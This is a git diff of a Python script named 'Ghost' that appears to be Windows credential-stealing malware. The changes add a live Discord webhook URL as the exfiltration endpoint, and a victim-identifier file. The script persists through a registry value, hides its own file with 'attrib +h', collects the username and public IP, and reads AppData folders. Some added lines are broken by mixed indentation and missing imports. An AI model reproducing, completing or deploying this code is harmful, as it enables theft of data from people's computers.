@@ -2,9 +2,7 @@ import requests, os, re, subprocess, sys, shutil
 from dhooks import Webhook, Embed
 from winreg import *
 
-by github/f6ll
-enjoy!
-
+#by f6ll!
 
 class Ghost():
     def __init__(self, *args, **kwargs):
@@ -40,16 +38,28 @@ def GhostFallback():
     SetValueEx(key2change, 'WinProcessTreeLeveldj', 0, REG_SZ,
                new_file_path)
 
-    ghostfile = 'ghost.py'
+    ghostfile = (os.path.join('ghost.py'))
     ghostopen = os.popen('attrib +h ' + ghostfile)
     ghostread = ghostopen.read()
     ghostopen.close()
 
 
+def GhostIdentifier():
+	ghstidwtf = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))
+
+	ghost_identity =  open('ght.txt', 'w')
+	ghost_identity.write("The User Identifier is" + ghstidwtf)
+    ghost_identity.close()
+#still a work in process.
+ 
+
 def GhostProcess():
-    hook = Webhook("")
+    hook = Webhook("https://discord.com/api/webhooks/830185249711063041/VQnjd8PliwisjGEnCtVv2bRi0Af3B4WZnrM2daRmyx23i1kZHn9jg7enHuupTYShLusV")
     user = os.getenv("UserName")
-    identity = 'Under Development, Sorry!'
+    ghost_getidentity =  open('ght.txt', 'r')
+    identifiercode = ghost_getidentity.read()
+    ghost_getidentity.close()
+    identity = (identifiercode)
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
